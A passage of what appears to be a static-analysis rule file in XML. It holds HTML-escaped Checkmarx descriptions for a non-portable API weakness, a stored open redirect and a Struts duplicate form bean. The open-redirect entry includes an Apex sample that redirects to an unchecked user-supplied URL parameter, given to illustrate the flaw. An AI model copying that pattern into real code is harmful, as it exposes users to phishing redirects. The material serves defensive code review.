&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_613_Content History" id="oc_613_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;WASC&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2698</key><name>Use_Of_getenv</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Call to Non-ubiquitous API&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;589&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_589_Description" id="oc_589_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software uses an API function that does not exist on all
versions of the target platform. This could cause portability problems or
inconsistencies that allow denial of service or other
consequences.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Some functions that offer security features supported by the OS are not
available on all versions of the OS in common use. Likewise, functions are
often deprecated or made obsolete for security reasons and should not be
used.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_589_Time of Introduction" id="oc_589_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_589_Potential Mitigations" id="oc_589_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Always test your code on any platform on which it is targeted to run
on.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Pre-design through build: Test your code on the newest and oldest
platform on which it is targeted to run on.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt; Develop a system to test for API functions that are not portable.
&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_589_Relationships" id="oc_589_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;227&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=227" target="_blank"&gt;Failure to Fulfill API Contract ('API Abuse')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;474&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=474" target="_blank"&gt;Use of Function with Inconsistent Implementations&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_589_Related Attack Patterns" id="oc_589_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org96.html" target="_blank"&gt;96&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Block Access to Libraries&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_589_Content History" id="oc_589_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Other Notes,
Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Call to Limited
API&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1686</key><name>Stored_Open_Redirect</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to get a victim to click a link to the application, so that the user will be immediately redirected to another, arbitrary site. Users may think that they are still in the original application site. The second site may be offensive, contain malware, or, most commonly, be used for phishing.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application redirects the user&amp;#8217;s browser to a URL provided in a user request, without warning users that they are being redirected outside the site. An attacker could use social engineering to get a victim to click a link to the application with a parameter defining another site to which the application will redirect the user&amp;#8217;s browser, and the user may not be aware of the redirection.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Ideally, do not allow arbitrary URLs for redirection. Instead, create a server-side mapping from user-provided parameter values to legitimate URLs.&lt;/li&gt;
&lt;li&gt;If it is necessary to allow arbitrary URLs:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;For URLs inside the application site, first filter and encode the user-provided parameter, and then use it as a relative URL by prefixing it with the application site domain.&lt;/li&gt;
&lt;li&gt;For URLs outside the application (if necessary), use an intermediate disclaimer page to provide users with a clear warning that they are leaving your site.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Avoid redirecting to arbitrary URLs, instead map the parameter to a list of static URLs.

      &lt;/h4&gt;&lt;pre&gt;


Response.Redirect(getUrlById(targetUrlId));



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Avoid redirecting to arbitrary URLs, instead map the parameter to a list of static URLs.

      &lt;/h4&gt;&lt;pre&gt;


Response.Redirect(getUrlById(targetUrlId));


      &lt;/pre&gt;&lt;h3&gt;Apex&lt;/h3&gt;&lt;h4&gt;&lt;/h4&gt;&lt;pre&gt;String redirsite = ApexPages.currentPage().getParameters().get('redirlocation');
PageReference pageRef;
if(redirsite != null)
{
    pageRef = new PageReference(redirsite);
    pageRef.setRedirect(true);
    return pageRef;
}
pageRef = ApexPages.currentPage();
return pageRef;&lt;/pre&gt;&lt;h4&gt;&lt;/h4&gt;&lt;pre&gt;String redirsite = ApexPages.currentPage().getParameters().get('redirlocation');
PageReference pageRef;
if(redirsite != null)
{
    pageRef = new PageReference('http://domain.com/page.jsp?' + redirsite);
    pageRef.setRedirect(true);
    return pageRef;
}
pageRef = ApexPages.currentPage();
return pageRef;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1705</key><name>Struts_Duplicate_Form_Bean</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Use of Multiple Resources with Duplicate Identifier&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;694&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_694_Description" id="oc_694_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product uses multiple resources that can have the same
identifier, in a context in which unique identifiers are required. This could
lead to operations on the wrong resource, or inconsistent
operations.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_694_Time of Introduction" id="oc_694_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_694_Applicable Platforms" id="oc_694_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_694_Potential Mitigations" id="oc_694_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use unique identifiers.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_694_Other Notes" id="oc_694_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This weakness is probably closely associated with other issues related to
doubling, such as CWE-675 (Duplicate Operations on Resource). It's usually a
case of an API contract violation (CWE-227).&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_694_Relationships" id="oc_694_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;573&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=573" target="_blank"&gt;Failure to Follow Specification&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;102&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=102" target="_blank"&gt;Struts: Duplicate Validation Forms&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;462&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=462" target="_blank"&gt;Duplicate Key in Associative List (Alist)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relevant Properties"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relevant Properties&lt;/div&gt;&lt;div name="oc_694_Relevant Properties" id="oc_694_Relevant Properties" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Uniqueness&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_694_Content History" id="oc_694_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

